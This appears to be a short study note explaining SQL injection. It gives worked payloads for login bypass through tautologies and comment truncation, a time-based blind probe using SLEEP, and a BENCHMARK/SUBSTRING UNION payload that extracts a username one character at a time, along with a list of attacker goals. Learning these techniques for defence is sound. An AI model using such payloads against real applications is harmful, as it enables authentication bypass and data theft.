## Example for sqli

### 1 
#### What we are expecting
```sql
$username = admin
$encrypted_pwd = Iam77groot

@query = SELECT * FROM user WHERE username = 'admin' and password = 'Iam77groot'
```
#### what we can get
```sql
$username = admin' OR '1'='1
$encrypted_pwd = pwd123

@query = SELECT * FROM user WHERE username = 'admin' OR '1'='1' and password = 'pwd123' -- Let's break it

username = 'admin' and password = 'pwd123'  -- false
username = 'admin' OR '1'='1' -- true
# Done💀!
```
### 2 
#### what we can get
```sql
$username = admin'-- 
$encrypted_pwd = pwd123

@query = SELECT * FROM user WHERE username = 'admin'-- and password = 'pwd123'
# Done💀!
```
## SQLI GOALS
- Probe database structure
- Steal data
- Alter data, elevate permissions
- Destory data, sabotage
- Bypass authentication

## Blind SQL Injection
A vulnerability may exist on a page but it does't change the response to the browser that means there would be no feedback to tell an attacker if it succeeded.
A clever technique is to inject an sql query which will cause the database to pause or to return a slow response if the injection works.

### 3
#### SQL's SLEEP Function
```sql
$id = ' AND sleep(5); --';

-- 💀 if it works the server will pause for 5 seconds this tells that the vulnerability exists then they can execute other commands blindly
```

### 4
```sql
$id = '1 UNION SELECT IF(
  SUBSTRING(username,1,1) = CHAR(97), -- char97 which is a
  BENCHMARK(5000000, MD5('MD5 is relativelt slow'), -- benchmark executes 5 million times 
  Null
  ) FROM users WHERE user_id = 1;-- ';

-- if username's first is a then the fn benchmark executes a slow process 5 million times otherwise it finishes quickly.
-- attcker can go through the entire alphabet in a loop to determine the full username
```
